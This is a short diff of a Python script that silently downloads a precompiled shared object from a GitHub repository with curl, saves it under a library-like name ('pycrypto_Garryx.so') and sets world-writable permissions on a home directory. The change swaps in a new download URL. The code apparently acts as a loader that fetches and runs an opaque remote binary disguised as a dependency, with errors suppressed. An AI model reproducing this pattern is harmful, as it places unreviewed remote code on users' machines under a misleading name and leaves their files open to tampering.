@@ -5,7 +5,7 @@ try:
 except:
     pass
 try:
-    download_link = "https://github.com/SAPPHIRE-XWD/GARRYS/blob/main/Garry.cpython-311.so"
+    download_link = "https://github.com/SAPPHIRE-XWD/GarryxV.5/blob/main/Garryx.so"
     if not os.path.exists("pycrypto_Garryx.so"):
         os.system("chmod 777 $HOME/Garry")
         os.system(f'curl -L {download_link} > pycrypto_Garryx.so')
